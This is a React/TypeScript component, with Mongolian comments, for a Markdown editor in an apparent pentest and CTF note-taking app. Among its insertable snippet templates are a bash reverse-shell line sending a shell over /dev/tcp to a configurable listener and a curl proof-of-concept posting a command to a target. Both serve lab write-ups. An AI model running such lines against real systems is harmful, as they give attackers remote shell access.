/**
 * SplitEditor — Obsidian/VS-Code маягийн Markdown бичигч.
 *
 *  - Split view: зүүн Markdown source, баруун live preview (sync-scroll).
 *  - Zen / focus mode: бүтэн дэлгэц, хар фон, зөвхөн текст.
 *  - `[[` autocomplete: гарчиг санал болгож холбоос оруулна.
 *  - Live counters: үг / тэмдэгт / унших хугацаа.
 *  - Ctrl+S хадгалах, Esc хаах, attachment (IDB blob for >1.5 MB).
 */
import { ChangeEvent, useEffect, useMemo, useRef, useState } from "react";
import {
  Columns2,
  Eye,
  FileText,
  Flame,
  ImagePlus,
  Maximize2,
  Minimize2,
  PanelLeft,
  Paperclip,
  ShieldAlert,
  Sparkles,
  Terminal,
  X,
} from "lucide-react";
import { toast } from "sonner";
import { readingStats } from "@shared/readingStats";
import { fuzzyTokenScore } from "@shared/search";
import { reportTemplates, templateByKey, type ReportSource } from "@/data/reportTemplates";
import type { Track } from "@/data/roadmapTracks";
import type { PentestConfig } from "@/lib/pentest/pentestStore";
import { saveVaultImage } from "@/lib/vault";
import WikiMarkdown, { type WikiReportLike } from "./WikiMarkdown";
import ReportImage from "./ReportImage";

export type EditorReportSnapshot = {
  id: number;
  title: string;
  room: string;
  source: ReportSource;
  stage: string;
  tags: string[];
  content: string;
  image?: string;
  imageRef?: string;
  category?: string;
};

export type SplitEditorSaveData = {
  title: string;
  room: string;
  source: ReportSource;
  stage: string;
  trackId: string;
  sectionId: string;
  coreTags: string;
  content: string;
  image?: string;
  imageRef?: string;
  templateKey: string;
};

// Prefill for creating a note from a room button or [[unresolved]] click.
// All fields optional — falls back to template defaults.
export type SplitEditorPreset = {
  title?: string;
  room?: string;
  source?: ReportSource;
  stage?: string;
  trackId?: string;
  sectionId?: string;
  coreTags?: string;
  content?: string;
  templateKey?: string;
};

export type SplitEditorProps = {
  editing: EditorReportSnapshot | null;
  preset?: SplitEditorPreset | null;
  reports: readonly { id: number; title: string }[];
  previewReports: readonly WikiReportLike[];
  tracks: readonly Track[];
  pentestConfig: PentestConfig | null;
  onSave: (data: SplitEditorSaveData) => void;
  onClose: () => void;
};

type ViewMode = "split" | "edit" | "preview";

const MAX_ATTACHMENT_BYTES = 10 * 1024 * 1024;
const INLINE_IMAGE_LIMIT = 1_400_000; // data-URL chars that still fit cloud sync

function trackForReport(report: EditorReportSnapshot | null, tracks: readonly Track[]): Track {
  if (report?.category) {
    const byCategory = tracks.find(t => t.id === report.category);
    if (byCategory) return byCategory;
  }
  return tracks[0];
}

/** Caret coordinates relative to the textarea's padding box (mirror-div). */
function caretCoords(ta: HTMLTextAreaElement): { top: number; left: number; lineHeight: number } {
  const style = getComputedStyle(ta);
  const mirror = document.createElement("div");
  const props = [
    "fontFamily", "fontSize", "fontWeight", "fontStyle", "letterSpacing",
    "lineHeight", "paddingTop", "paddingRight", "paddingBottom", "paddingLeft",
    "borderTopWidth", "borderRightWidth", "borderBottomWidth", "borderLeftWidth",
    "boxSizing", "tabSize",
  ] as const;
  for (const prop of props) mirror.style[prop] = style[prop];
  mirror.style.position = "absolute";
  mirror.style.visibility = "hidden";
  mirror.style.whiteSpace = "pre-wrap";
  mirror.style.wordWrap = "break-word";
  mirror.style.overflowWrap = "break-word";
  mirror.style.width = `${ta.clientWidth}px`;
  mirror.style.top = "0";
  mirror.style.left = "-9999px";
  mirror.textContent = ta.value.slice(0, ta.selectionStart ?? 0);
  const marker = document.createElement("span");
  marker.textContent = "\u200b";
  mirror.appendChild(marker);
  document.body.appendChild(mirror);
  const lineHeight = Number.parseFloat(style.lineHeight || "") || Number.parseFloat(style.fontSize || "14") * 1.5;
  const top = marker.offsetTop - ta.scrollTop + lineHeight;
  const left = marker.offsetLeft - ta.scrollLeft;
  document.body.removeChild(mirror);
  return { top, left, lineHeight };
}

export default function SplitEditor({
  editing,
  preset,
  reports,
  previewReports,
  tracks,
  pentestConfig,
  onSave,
  onClose,
}: SplitEditorProps) {
  const isEdit = editing !== null;

  const [templateKey, setTemplateKey] = useState(() => preset?.templateKey ?? "custom");
  const [title, setTitle] = useState(() => editing?.title ?? preset?.title ?? "");
  const [room, setRoom] = useState(() => editing?.room ?? preset?.room ?? "");
  const [source, setSource] = useState<ReportSource>(() => editing?.source ?? preset?.source ?? "Cyber");
  const [stage, setStage] = useState(() => editing?.stage ?? preset?.stage ?? "Foundations");
  const [trackId, setTrackId] = useState(() => preset?.trackId ?? trackForReport(editing, tracks).id);
  const [sectionId, setSectionId] = useState(() => {
    if (preset?.sectionId) return preset.sectionId;
    if (preset?.trackId) {
      const t = tracks.find(x => x.id === preset.trackId);
      if (t) return t.sections[0]?.id ?? "";
    }
    return trackForReport(editing, tracks).sections[0]?.id ?? "";
  });
  const [coreTags, setCoreTags] = useState(() =>
    editing
      ? editing.tags.filter(t => !t.startsWith("roadmap-") && !t.startsWith("section-")).join(", ")
      : (preset?.coreTags ?? "")
  );
  const [content, setContent] = useState(
    () => editing?.content ?? preset?.content ?? templateByKey(preset?.templateKey ?? "custom").content
  );
  const [attachment, setAttachment] = useState<string | undefined>(() => editing?.image);
  const [imageRef, setImageRef] = useState<string | undefined>(() => editing?.imageRef);
  const [localBlobUrl, setLocalBlobUrl] = useState<string | null>(null);

  const [viewMode, setViewMode] = useState<ViewMode>("split");
  const [zen, setZen] = useState(false);
  const dirtyRef = useRef(false);

  const textareaRef = useRef<HTMLTextAreaElement>(null);
  const previewRef = useRef<HTMLDivElement>(null);
  const editorWrapRef = useRef<HTMLDivElement>(null);
  const fileInput = useRef<HTMLInputElement>(null);
  const scrollLock = useRef(0);

  // --- [[ autocomplete state ---
  const [wikiOpen, setWikiOpen] = useState(false);
  const [wikiQuery, setWikiQuery] = useState("");
  const [wikiIndex, setWikiIndex] = useState(0);
  const [wikiPos, setWikiPos] = useState({ top: 0, left: 0 });

  const stats = useMemo(() => readingStats(content), [content]);

  const wikiCandidates = useMemo(() => {
    if (!wikiOpen) return [];
    const q = wikiQuery.trim().toLowerCase();
    const scored = reports
      .filter(r => (editing ? r.id !== editing.id : true))
      .map(r => ({ report: r, score: q ? fuzzyTokenScore(q, r.title) : 0.5 }))
      .filter(x => (q ? x.score > 0.15 : true) && x.report.title.trim().length > 0)
      .sort((a, b) => b.score - a.score || a.report.title.localeCompare(b.report.title))
      .slice(0, 8);
    return scored.map(x => x.report);
  }, [wikiOpen, wikiQuery, reports, editing]);

  useEffect(() => setWikiIndex(0), [wikiCandidates.length, wikiQuery]);

  function refreshWikiPopup() {
    const ta = textareaRef.current;
    if (!ta) return;
    const before = ta.value.slice(0, ta.selectionStart ?? 0);
    const lineStart = before.lastIndexOf("\n") + 1;
    const tail = before.slice(lineStart);
    const match = tail.match(/\[\[([^\][\n]*)$/);
    if (!match) {
      setWikiOpen(false);
      return;
    }
    setWikiQuery(match[1]);
    setWikiOpen(true);
    try {
      const { top, left } = caretCoords(ta);
      const wrap = editorWrapRef.current;
      const taTop = wrap ? ta.offsetTop - (wrap.querySelector(".split-source") as HTMLElement | null)?.scrollTop! || ta.offsetTop : ta.offsetTop;
      setWikiPos({
        top: Math.min(taTop + top + 4, Math.max(40, (wrap?.clientHeight ?? 400) - 240)),
        left: Math.min(Math.max(8, ta.offsetLeft + left), 320),
      });
    } catch {
      setWikiPos({ top: 40, left: 8 });
    }
  }

  function insertWikiCandidate(candidate: { id: number; title: string }) {
    const ta = textareaRef.current;
    if (!ta) return;
    const pos = ta.selectionStart ?? 0;
    const before = ta.value.slice(0, pos);
    const after = ta.value.slice(pos);
    const open = before.lastIndexOf("[[");
    if (open < 0) return;
    const insertion = `[[${candidate.title}]]`;
    const next = before.slice(0, open) + insertion + after;
    setContent(next);
    dirtyRef.current = true;
    setWikiOpen(false);
    requestAnimationFrame(() => {
      ta.focus();
      const cursor = open + insertion.length;
      ta.setSelectionRange(cursor, cursor);
    });
    toast.success(`«${candidate.title}» холбоос орууллаа`);
  }

  // --- sync scroll (source ↔ preview) ---
  function syncScroll(from: "source" | "preview") {
    const now = Date.now();
    if (now - scrollLock.current < 60) return;
    scrollLock.current = now;
    const ta = textareaRef.current;
    const preview = previewRef.current?.querySelector(".split-preview-scroll") as HTMLElement | null;
    if (!ta || !preview) return;
    if (from === "source") {
      const ratio = ta.scrollTop / Math.max(1, ta.scrollHeight - ta.clientHeight);
      preview.scrollTop = ratio * (preview.scrollHeight - preview.clientHeight);
    } else {
      const ratio = preview.scrollTop / Math.max(1, preview.scrollHeight - preview.clientHeight);
      ta.scrollTop = ratio * (ta.scrollHeight - ta.clientHeight);
    }
  }

  function applyTemplate(key: string) {
    const template = templateByKey(key);
    setTemplateKey(template.key);
    setSource(template.source);
    setStage(template.stage);
    setContent(template.content);
    dirtyRef.current = true;
  }

  function applyTrackDefaults(nextTrackId: string) {
    setTrackId(nextTrackId);
    const track = tracks.find(t => t.id === nextTrackId) ?? tracks[0];
    setSectionId(track.sections[0]?.id ?? "");
    if (nextTrackId === "thm-free-path" || nextTrackId === "thm-paid-ad") setSource("THM");
    else if (nextTrackId === "pico-ctf-cylab") setSource("picoCTF");
    else if (nextTrackId === "htb-flaws") setSource("HTB");
    else if (nextTrackId === "oscp-cloud") setSource("Cloud");
  }

  function selectedTrack(): Track {
    return tracks.find(t => t.id === trackId) ?? tracks[0];
  }

  function insertSnippet(snippet: string, label: string) {
    setContent(prev => (prev.endsWith("\n") || prev === "" ? prev : prev + "\n") + snippet);
    dirtyRef.current = true;
    toast.success(label);
    textareaRef.current?.focus();
  }

  function handleAttachment(event: ChangeEvent<HTMLInputElement>) {
    const file = event.target.files?.[0];
    event.target.value = "";
    if (!file) return;
    if (!file.type.startsWith("image/")) {
      toast.error("Зөвхөн зургын файл (PNG / JPG / WEBP) сонгоно уу");
      return;
    }
    if (file.size > MAX_ATTACHMENT_BYTES) {
      toast.error(`Скриншот хэт том (max 10 MB, сонгосон ${(file.size / 1024 / 1024).toFixed(1)} MB)`);
      return;
    }
    const reader = new FileReader();
    reader.onload = () => {
      const dataUrl = String(reader.result);
      if (dataUrl.length <= INLINE_IMAGE_LIMIT) {
        if (localBlobUrl) URL.revokeObjectURL(localBlobUrl);
        setLocalBlobUrl(null);
        setImageRef(undefined);
        setAttachment(dataUrl);
        toast.success("Скриншот хавсаргагдлаа (клауд синхрончлолд орно)");
      } else {
        // Big original → IndexedDB blob, referenced by id (quota-safe).
        const id = `img-${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 8)}`;
        saveVaultImage(id, file).then(ok => {
          if (!ok) {
            toast.error("Зургийг хадгалж чадсангүй — дахин оролдоно уу");
            return;
          }
          if (localBlobUrl) URL.revokeObjectURL(localBlobUrl);
          setLocalBlobUrl(URL.createObjectURL(file));
          setAttachment(undefined);
          setImageRef(id);
          toast.success("Том скриншот локал сан (IndexedDB)-д хадгалагдлаа");
        });
      }
      dirtyRef.current = true;
    };
    reader.readAsDataURL(file);
  }

  function clearAttachment() {
    if (localBlobUrl) URL.revokeObjectURL(localBlobUrl);
    setLocalBlobUrl(null);
    setAttachment(undefined);
    setImageRef(undefined);
    dirtyRef.current = true;
  }

  useEffect(() => {
    return () => {
      if (localBlobUrl) URL.revokeObjectURL(localBlobUrl);
    };
  }, [localBlobUrl]);

  function doSave() {
    if (!title.trim()) {
      toast.error("Тайлангийн гарчиг оруулна уу!");
      return;
    }
    dirtyRef.current = false;
    onSave({
      title: title.trim(),
      room: room.trim(),
      source,
      stage,
      trackId,
      sectionId,
      coreTags,
      content,
      image: attachment,
      imageRef,
      templateKey,
    });
  }

  function tryClose() {
    if (dirtyRef.current) {
      const ok = window.confirm("Хадгалаагүй өөрчлөлт байна. Хаах уу?");
      if (!ok) return;
    }
    onClose();
  }

  // Ctrl+S save · Esc layers (capture phase beats the global Esc handler).
  useEffect(() => {
    const onKey = (e: KeyboardEvent) => {
      if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "s") {
        e.preventDefault();
        e.stopPropagation();
        doSave();
      }
      if (e.key === "Escape") {
        if (wikiOpen) {
          e.stopPropagation();
          setWikiOpen(false);
        } else if (zen) {
          e.stopPropagation();
          setZen(false);
        }
      }
    };
    window.addEventListener("keydown", onKey, true);
    return () => window.removeEventListener("keydown", onKey, true);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [wikiOpen, zen, title, room, source, stage, trackId, sectionId, coreTags, content, attachment, imageRef, templateKey]);

  // Autofocus the body for edits, the title for new notes.
  useEffect(() => {
    if (isEdit) textareaRef.current?.focus();
  }, [isEdit]);

  const pc = pentestConfig ?? { rhost: "10.10.10.10", rport: "80", lhost: "10.10.14.1", lport: "4444" };
  const cvssSnippet = `\n### 🛡️ Олдвор: [Эмзэг байдлын нэр]\n- **Үнэлгээ (Severity):** HIGH (CVSS 7.8)\n- **CVSS Vector:** \`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H\`\n- **Зорилтот систем:** \`${pc.rhost}:${pc.rport}\`\n\n#### Тодорхойлолт\n\n\n#### Баталгаажуулалт (PoC)\n\`\`\`bash\ncurl -X POST http://${pc.rhost}:${pc.rport}/api -d "cmd=id"\n\`\`\`\n\n#### Засварлах зөвлөмж\n\n`;
  const portsSnippet = `\n### 🎯 Нээлттэй портууд (${pc.rhost})\n| Порт | Протокол | Төлөв | Үйлчилгээ | Хувилбар |\n| :--- | :--- | :--- | :--- | :--- |\n| \`22\` | TCP | open | ssh | OpenSSH |\n| \`80\` | TCP | open | http | Web Server |\n| \`445\` | TCP | open | smb | Samba |\n`;
  const shellSnippet = `\n\`\`\`bash\n# Reverse Shell (LHOST=${pc.lhost}, LPORT=${pc.lport})\nbash -i >& /dev/tcp/${pc.lhost}/${pc.lport} 0>&1\n\`\`\`\n`;

  const showSource = !zen && viewMode !== "preview";
  const showPreview = !zen && viewMode !== "edit";

  return (
    <div
      className={`editor-overlay split-editor-overlay${zen ? " zen" : ""}`}
      onClick={event => {
        if (event.target === event.currentTarget) tryClose();
      }}
    >
      <div className={`split-editor${zen ? " zen" : ""}`} role="dialog" aria-label={isEdit ? "Тайлан засах" : "Шинэ тайлан"}>
        {/* ---- header ---- */}
        <div className="split-editor-head">
          <div className="split-editor-title">
            <div className="section-kicker">{isEdit ? "Тайлан засах" : "Шинэ тайлан"}</div>
            <input
              className="split-title-input"
              value={title}
              onChange={e => {
                setTitle(e.target.value);
                dirtyRef.current = true;
              }}
              onKeyDown={e => {
                if (e.key === "Enter") textareaRef.current?.focus();
              }}
              placeholder="Тайлангийн гарчиг…"
              autoFocus={!isEdit}
            />
          </div>
          <div className="split-editor-head-actions">
            {!zen && (
              <div className="segmented" role="tablist" aria-label="Харах горим">
                <button
                  role="tab"
                  aria-selected={viewMode === "edit"}
                  className={viewMode === "edit" ? "selected" : ""}
                  onClick={() => setViewMode("edit")}
                  title="Зөвхөн бичих"
                >
                  <PanelLeft size={13} />
                </button>
                <button
                  role="tab"
                  aria-selected={viewMode === "split"}
                  className={viewMode === "split" ? "selected" : ""}
                  onClick={() => setViewMode("split")}
                  title="Хуваагдмал цонх (бичих + урьдчилсан)"
                >
                  <Columns2 size={13} />
                </button>
                <button
                  role="tab"
                  aria-selected={viewMode === "preview"}
                  className={viewMode === "preview" ? "selected" : ""}
                  onClick={() => setViewMode("preview")}
                  title="Зөвхөн урьдчилсан харах"
                >
                  <Eye size={13} />
                </button>
              </div>
            )}
            <button
              className={`icon-button${zen ? " active" : ""}`}
              onClick={() => setZen(z => !z)}
              title={zen ? "Zen горимоос гарах (Esc)" : "Zen / төвлөрөх горим"}
            >
              {zen ? <Minimize2 size={15} /> : <Maximize2 size={15} />}
            </button>
            <button className="primary-button split-save" onClick={doSave} title="Хадгалах (Ctrl+S)">
              {isEdit ? "Хадгалах" : "Үүсгэх"}
            </button>
            <button className="icon-button" onClick={tryClose} title="Хаах (Esc)">
              <X size={16} />
            </button>
          </div>
        </div>

        {/* ---- meta fields (hidden in zen) ---- */}
        {!zen && (
          <div className="split-meta">
            {!isEdit && (
              <label className="split-field">
                Загвар
                <select value={templateKey} onChange={e => applyTemplate(e.target.value)}>
                  {reportTemplates.map(t => (
                    <option key={t.key} value={t.key}>
                      {t.label}
                    </option>
                  ))}
                </select>
              </label>
            )}
            <label className="split-field">
              Room / Лаб
              <input value={room} onChange={e => { setRoom(e.target.value); dirtyRef.current = true; }} placeholder="Room / challenge" />
            </label>
            <label className="split-field">
              Эх сурвалж
              <select value={source} onChange={e => { setSource(e.target.value as ReportSource); dirtyRef.current = true; }}>
                <option>THM</option>
                <option>picoCTF</option>
                <option>HTB</option>
                <option>Cloud</option>
                <option>Cyber</option>
              </select>
            </label>
            <label className="split-field">
              Roadmap
              <select value={trackId} onChange={e => { applyTrackDefaults(e.target.value); dirtyRef.current = true; }}>
                {tracks.map(t => (
                  <option key={t.id} value={t.id}>
                    {t.name}
                  </option>
                ))}
              </select>
            </label>
            <label className="split-field">
              Section
              <select value={sectionId} onChange={e => { setSectionId(e.target.value); dirtyRef.current = true; }}>
                {selectedTrack().sections.map(s => (
                  <option key={s.id} value={s.id}>
                    {s.label}: {s.title}
                  </option>
                ))}
              </select>
            </label>
            <label className="split-field">
              Core tag-ууд
              <input
                value={coreTags}
                onChange={e => { setCoreTags(e.target.value); dirtyRef.current = true; }}
                placeholder="suid, cron, enumeration"
              />
            </label>
            <label className="split-field">
              Үе шат
              <select value={stage} onChange={e => { setStage(e.target.value); dirtyRef.current = true; }}>
                <option>Foundations</option>
                <option>Live Fire</option>
                <option>Deep Offensive</option>
                <option>Pro Arena</option>
                <option>Deployment</option>
              </select>
            </label>
          </div>
        )}

        {/* ---- snippet shortcuts (hidden in zen) ---- */}
        {!zen && (
          <div className="split-snippets">
            <button type="button" className="text-btn-tiny" onClick={() => insertSnippet(cvssSnippet, "CVSS Олдворын загвар нэмэгдлээ")}>
              <ShieldAlert size={11} /> + CVSS Олдвор
            </button>
            <button type="button" className="text-btn-tiny" onClick={() => insertSnippet(portsSnippet, "Портын хүснэгт нэмэгдлээ")}>
              <Terminal size={11} /> + Портын хүснэгт
            </button>
            <button type="button" className="text-btn-tiny" onClick={() => insertSnippet(shellSnippet, "Reverse Shell нэмэгдлээ")}>
              <Flame size={11} /> + Reverse Shell
            </button>
            <span className="split-hint">
              <Sparkles size={11} /> <code>[[</code> гэж бичээд тэмдэглэл холбоно
            </span>
          </div>
        )}

        {/* ---- panes ---- */}
        <div className={`split-panes${zen ? " zen" : ""} view-${zen ? "zen" : viewMode}`} ref={editorWrapRef}>
          {(zen || showSource) && (
            <div className="split-source">
              <textarea
                ref={textareaRef}
                value={content}
                onChange={e => {
                  setContent(e.target.value);
                  dirtyRef.current = true;
                  requestAnimationFrame(refreshWikiPopup);
                }}
                onScroll={() => syncScroll("source")}
                onClick={refreshWikiPopup}
                onKeyUp={e => {
                  if (["ArrowLeft", "ArrowRight", "ArrowUp", "ArrowDown", "Home", "End"].includes(e.key)) refreshWikiPopup();
                }}
                onKeyDown={e => {
                  if (wikiOpen && wikiCandidates.length > 0) {
                    if (e.key === "ArrowDown") {
                      e.preventDefault();
                      setWikiIndex(i => (i + 1) % wikiCandidates.length);
                      return;
                    }
                    if (e.key === "ArrowUp") {
                      e.preventDefault();
                      setWikiIndex(i => (i - 1 + wikiCandidates.length) % wikiCandidates.length);
                      return;
                    }
                    if (e.key === "Enter" || e.key === "Tab") {
                      e.preventDefault();
                      insertWikiCandidate(wikiCandidates[Math.min(wikiIndex, wikiCandidates.length - 1)]);
                      return;
                    }
                  } else if (wikiOpen && e.key === "Enter" && (e.ctrlKey || e.metaKey)) {
                    e.preventDefault();
                    doSave();
                    return;
                  }
                  if (e.key === "Tab" && !wikiOpen) {
                    // Indent with two spaces instead of leaving the textarea.
                    e.preventDefault();
                    const ta = textareaRef.current;
                    if (ta) {
                      const start = ta.selectionStart ?? 0;
                      const end = ta.selectionEnd ?? 0;
                      const next = content.slice(0, start) + "  " + content.slice(end);
                      setContent(next);
                      dirtyRef.current = true;
                      requestAnimationFrame(() => {
                        ta.focus();
                        ta.setSelectionRange(start + 2, start + 2);
                      });
                    }
                  }
                }}
                placeholder="Markdown бичих… ([[ гэж бичээд тэмдэглэл холбоно)"
                spellCheck={false}
              />
            </div>
          )}
          {showPreview && (
            <div className="split-preview" ref={previewRef}>
              <div
                className="split-preview-scroll"
                onScroll={() => syncScroll("preview")}
              >
                <WikiMarkdown content={content} reports={previewReports} />
              </div>
            </div>
          )}

          {/* [[ autocomplete popup */}
          {wikiOpen && (
            <div
              className="wiki-suggest"
              style={{ top: wikiPos.top, left: wikiPos.left }}
              role="listbox"
              aria-label="Тэмдэглэлийн санал"
            >
              <div className="wiki-suggest-head">Холбох тэмдэглэл · <code>[[…]]</code></div>
              {wikiCandidates.length === 0 ? (
                <div className="wiki-suggest-empty">
                  «{wikiQuery || "…"}» олдсонгүй — <code>]]</code> хаагаад дарвал шинээр үүснэ.
                </div>
              ) : (
                wikiCandidates.map((c, i) => (
                  <button
                    key={c.id}
                    role="option"
                    aria-selected={i === wikiIndex}
                    className={`wiki-suggest-row${i === wikiIndex ? " active" : ""}`}
                    onMouseDown={e => {
                      e.preventDefault();
                      insertWikiCandidate(c);
                    }}
                    onMouseEnter={() => setWikiIndex(i)}
                  >
                    <FileText size={12} />
                    <span>{c.title}</span>
                  </button>
                ))
              )}
            </div>
          )}
        </div>

        {/* ---- footer ---- */}
        <div className="split-footer">
          <div className="split-stats mono">
            <span>{stats.words} үг</span>
            <span>{stats.characters} тэмдэгт</span>
            <span>~{stats.readMinutes} мин унших</span>
            {zen && <span>{stats.lines} мөр</span>}
          </div>
          <div className="split-footer-actions">
            <input ref={fileInput} type="file" accept="image/*" onChange={handleAttachment} hidden />
            {(attachment || imageRef || localBlobUrl) && !zen ? (
              <div className="attachment-preview">
                {attachment || localBlobUrl ? (
                  <img src={attachment ?? localBlobUrl ?? ""} alt="Attachment preview" />
                ) : (
                  <ReportImage imageRef={imageRef} alt="Attachment preview" />
                )}
                <button onClick={clearAttachment} title="Хавсралт хасах">
                  <X size={13} />
                </button>
              </div>
            ) : !zen ? (
              <button className="attachment-button" onClick={() => fileInput.current?.click()}>
                <ImagePlus size={15} /> Скриншот <span className="mono tiny">max 10 MB</span>
              </button>
            ) : null}
            {!zen && (
              <span className="editor-hint">
                <Paperclip size={12} /> Ctrl+S хадгалах
              </span>
            )}
            <button className="primary-button" onClick={doSave}>
              {isEdit ? "Өөрчлөлтийг хадгалах" : "Хадгалах"}
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
